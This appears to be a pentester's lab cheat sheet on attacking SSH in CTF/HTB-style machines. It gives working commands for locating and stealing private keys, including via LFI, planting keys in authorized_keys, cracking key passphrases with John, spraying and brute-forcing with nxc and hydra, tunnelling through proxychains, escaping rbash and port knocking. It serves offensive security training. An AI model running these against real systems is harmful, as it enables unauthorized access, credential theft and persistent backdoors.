nmap scripts
```
nmap -p 22 --script=ssh-hostkey,ssh-auth-methods,sshv1 <target-ip>
```

different types:
RSA
- stored on linux at /home/anita/.ssh/id_rsa
-  stored on windows at C:\Users\<Username>\.ssh\id_rsa
DSA
- stored on linux at /home/anita/.ssh/id_dsa
- stored on windows at C:\Users\<Username>\.ssh\id_dsa
ecdsa
- stored on linux at /home/anita/.ssh/id_ecdsa
- stored on windows at C:\Users\<Username>\.ssh\id_ecdsa
ed25519
- stored on linux at /home/anita/.ssh/id_ed25519
- stored on windows at C:\Users\<Username>\.ssh\id_ed25519

if LFI, check `/etc/ssh/sshd_config` to see ssh key locations

.ssh folder in user's home directory
- make sure id_rsa.pub and authorized_keys are identical
```
md5sum id_rsa.pub
```
```
md5sum authorized_keys
```
- if hash is identical, transfer id_rsa file (not the .pub) to home machine and ssh in without password

Generate ssh key pair
```
ssh-keygen -t ed25519 -f ./id_ed25519
```
- key will be saved as `id_ed25519` (private key) and `id_ed25519.pub` (public key) in the current directory (`./`)
- upload `id_ed25519.pub` to target machine I want to SSH into
	- or just copy the contents to the authorized_keys file on remote machine:
```
cat id_ed25519.pub
```
- on local machine
on remote machine in the /home/user directory:
```
mkdir .ssh && cd .ssh
```
```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqwSCwB7vK26CckpfDL1D0+/z6sf42jocBMLUsbca+m daniel@daniel" > authorized_keys
```
- run command on my kali machine:
```
ssh -i id_ed25519 root@pilgrimage.htb
```

once you get private key:
- make id_ecdrsa
	- set correct permissions
		- `chmod 600 /path/to/id_ecdsa`
- `ssh2john id_ecdsa > anita.hash`
- `john --wordlist=/usr/share/wordlists/rockyou.txt anita.hash`
	- fireball
```
ssh -i ./id_ecdsa anita@192.168.164.245 -p 2222
```

Generating rsa ssh keys in /var/www if only have www-data shell on target machine:
```
cd /var/www
```
```
mkdir .ssh
```
```
ssh-keygen -q -t rsa -N '' -C 'pam'
```
```
cp .ssh/id_rsa.pub .ssh/authorized_keys
```
```
chmod 600 .ssh/authorized_keys 
```
- then, copy private key to local host machine
```
ssh -i id_rsa www-date@10.10.10.6
```
- run from kali

spray
```
nxc ssh ip -u user -p pass
```

bruteforce
```
hydra -l offsec -P /usr/share/wordlists/rockyou.txt ssh://192.168.203.122 -V
```

ssh tunneling aka port forwarding:
```
ssh -L [local_port]:127.0.0.1:[remote_port] [username]@[remote_host]
```
- if port forward is blocked `channel 3: open failed: administratively prohibited: open failed` use proxychains instead:
	- add `socks4  127.0.0.1 8081` to `/etc/proxychains4.conf` in kali
	- `ssh charix@10.129.1.254 -D 8081` run from kali
	- `proxychains vncviewer 127.0.0.1:5901 -passwd secret` run from kali
		- example using vncviewer and password file


Escape rbash shell with `-t bash`
```
ssh mindy@10.129.226.162 -t bash
```
- `-t bash` instructs ssh to use bash as shell instead of whatever is default assigned in /etc/passwd
- if regular ssh command pops you into a limited -rbash shell, use this

#### Port Knocking
`ps -auxww` will show `/usr/sbin/knockd` running
- `cat /etc/knockd.conf` and will see openSSH sequence = 571, 290, 911
	- Put together a script to hit those 3 ports within 5 seconds to open SSH on the host and then connect in:
```
for i in 571 290 911; do
nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.129.222.16 >/dev/null
done; ssh -i id_rsa amrois@10.129.222.16
```
- might take multiple tries to run this one-liner from bash on kali host